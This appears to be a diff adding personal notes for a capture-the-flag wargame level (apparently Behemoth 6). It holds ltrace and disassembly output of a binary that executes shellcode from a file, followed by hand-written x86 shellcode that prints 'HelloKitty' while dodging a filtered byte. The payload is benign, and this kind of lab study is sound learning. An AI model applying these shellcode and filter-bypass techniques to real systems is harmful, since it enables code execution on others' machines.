@@ -1,0 +1,139 @@
+/tmp/tmp.vIYhAOeAZ6
+
+$ ltrace ./behemoth6
+__libc_start_main(0x804910d, 1, 0xffffd454, 0 <unfinished ...>
+popen("/behemoth/behemoth6_reader", "r")                                                          = 0x804d1a0
+malloc(10)                                                                                        = 0x804d300
+fread(0x804d300, 10, 1, 0x804d1a0)                                                                = 1
+pclose(0x804d1a0 <no return ...>
+--- SIGCHLD (Child exited) ---
+<... pclose resumed> )                                                                            = 256
+strcmp("Couldn't o", "HelloKitty")                                                                = -1
+puts("Incorrect output."Incorrect output.
+)                                                                         = 18
++++ exited (status 0) +++
+
+$ ltrace /behemoth/behemoth6_reader
+__libc_start_main(0x80490ad, 1, 0xffffd424, 0 <unfinished ...>
+open("shellcode.txt", 0, 00)                                                                     = -1
+puts("Couldn't open shellcode.txt!"Couldn't open shellcode.txt!
+)                                                             = 29
+exit(1 <no return ...>
++++ exited (status 1) +++
+
+│           0x08049196      8d4c2404       lea ecx, [argv]
+│           0x0804919a      83e4f0         and esp, 0xfffffff0
+│           0x0804919d      ff71fc         push dword [ecx - 4]
+│           0x080491a0      55             push ebp
+│           0x080491a1      89e5           mov ebp, esp
+│           0x080491a3      51             push ecx
+│           0x080491a4      83ec14         sub esp, 0x14
+│           0x080491a7      83ec08         sub esp, 8
+│           0x080491aa      6a00           push 0
+│           0x080491ac      6808a00408     push str.shellcode.txt      ; 0x804a008 ; "shellcode.txt"
+│           0x080491b1      e8aafeffff     call sym.imp.open           ; int open(const char *path, int oflag)
+│           0x080491b6      83c410         add esp, 0x10
+│           0x080491b9      8945ec         mov dword [var_14h], eax
+│           0x080491bc      837dec00       cmp dword [var_14h], 0
+│       ┌─< 0x080491c0      791a           jns 0x80491dc
+│       │   0x080491c2      83ec0c         sub esp, 0xc
+│       │   0x080491c5      6816a00408     push str.Couldnt_open_shellcode.txt_ ; 0x804a016 ; "Couldn't open shellcode.txt!"
+│       │   0x080491ca      e871feffff     call sym.imp.puts           ; int puts(const char *s)
+│       │   0x080491cf      83c410         add esp, 0x10
+│       │   0x080491d2      83ec0c         sub esp, 0xc
+│       │   0x080491d5      6a01           push 1                      ; 1 ; int status
+│       │   0x080491d7      e874feffff     call sym.imp.exit           ; void exit(int status)
+│       │   ; CODE XREF from main @ 0x80491c0(x)
+│       └─> 0x080491dc      83ec08         sub esp, 8
+│           0x080491df      6a00           push 0
+│           0x080491e1      ff75ec         push dword [var_14h]
+│           0x080491e4      6a02           push 2                      ; 2
+│           0x080491e6      6a07           push 7                      ; 7
+│           0x080491e8      6800100000     push 0x1000
+│           0x080491ed      6a00           push 0
+│           0x080491ef      e87cfeffff     call sym.imp.mmap           ; void*mmap(void*addr, size_t length, int prot, int flags, int fd, size_t offset)
+│           0x080491f4      83c420         add esp, 0x20
+│           0x080491f7      8945f0         mov dword [var_10h], eax
+│           0x080491fa      c745e80000..   mov dword [var_18h], 0
+│       ┌─< 0x08049201      eb2d           jmp 0x8049230
+│       │   ; CODE XREF from main @ 0x8049237(x)
+│      ┌──> 0x08049203      8b55e8         mov edx, dword [var_18h]
+│      ╎│   0x08049206      8b45f0         mov eax, dword [var_10h]
+│      ╎│   0x08049209      01d0           add eax, edx
+│      ╎│   0x0804920b      0fb600         movzx eax, byte [eax]
+│      ╎│   0x0804920e      3c0b           cmp al, 0xb                 ; 11
+│     ┌───< 0x08049210      751a           jne 0x804922c
+│     │╎│   0x08049212      83ec0c         sub esp, 0xc
+│     │╎│   0x08049215      6833a00408     push str.Write_your_own_shellcode. ; 0x804a033 ; "Write your own shellcode."
+│     │╎│   0x0804921a      e821feffff     call sym.imp.puts           ; int puts(const char *s)
+│     │╎│   0x0804921f      83c410         add esp, 0x10
+│     │╎│   0x08049222      83ec0c         sub esp, 0xc
+│     │╎│   0x08049225      6a01           push 1                      ; 1 ; int status
+│     │╎│   0x08049227      e824feffff     call sym.imp.exit           ; void exit(int status)
+│     │╎│   ; CODE XREF from main @ 0x8049210(x)
+│     └───> 0x0804922c      8345e801       add dword [var_18h], 1
+│      ╎│   ; CODE XREF from main @ 0x8049201(x)
+│      ╎└─> 0x08049230      817de8ff0f..   cmp dword [var_18h], 0xfff
+│      └──< 0x08049237      7eca           jle 0x8049203
+│           0x08049239      8b45f0         mov eax, dword [var_10h]
+│           0x0804923c      8945f4         mov dword [var_ch], eax
+│           0x0804923f      8b45f4         mov eax, dword [var_ch]
+│           0x08049242      ffd0           call eax
+│           0x08049244      b800000000     mov eax, 0
+│           0x08049249      8b4dfc         mov ecx, dword [var_4h]
+│           0x0804924c      c9             leave
+│           0x0804924d      8d61fc         lea esp, [ecx - 4]
+└           0x08049250      c3             ret
+[
+
+Making a sys-call:
+
+# eax - syscall nr
+# ebx - arg 1
+# ecx - arg 2
+# edx - arg 3
+# 
+int 0x80 
+
+write is syscall 4 (fd, buffer, count), stdout is fd=1
+
+Dump of assembler code for function _start:
+   0x08049000 <+0>:     b8 04 00 00 00          mov    $0x4,%eax
+   0x08049005 <+5>:     bb 01 00 00 00          mov    $0x1,%ebx
+   0x0804900a <+10>:    68 43 42 41 00          push   $0x414243
+   0x0804900f <+15>:    89 e1                   mov    %esp,%ecx
+   0x08049011 <+17>:    ba 04 00 00 00          mov    $0x4,%edx
+   0x08049016 <+22>:    cd 80                   int    $0x80
+   0x08049018 <+24>:    b8 01 00 00 00          mov    $0x1,%eax
+   0x0804901d <+29>:    bb 00 00 00 00          mov    $0x0,%ebx
+   0x08049022 <+34>:    cd 80                   int    $0x80
+E
+
+r2 > ?x HelloKitty
+48656c6c 6f4b6974 7479
+0x00007974
+0x74694b6f
+0x6c6c6548
+
+.text
+.global _start
+_start:
+  mov $4, %eax        # WRITE is syscall 4
+  mov $1, %ebx        # ARG 1 is fd for STDOUT
+  push $0x00007974    # PUSH string on stack (grows down)
+  push $0x74694b6f
+  push $0x6c6c6548
+  mov %esp, %ecx      # ARG 2: The pointer to the string is the stack pointer
+  #mov $11, %edx        # ARG 3: length of string, NOTE! Byte 11 is checked for in the shellcode, workaround!
+  mov $10, %edx
+  inc %edx
+  int $0x80
+
+  mov $1, %eax        # EXIT is syscall 1
+  mov $0, %ebx        # ARG 1, return code 0
+  int $0x80
+
+$ gcc -m32 -nostdlib hello.s
+
+
+
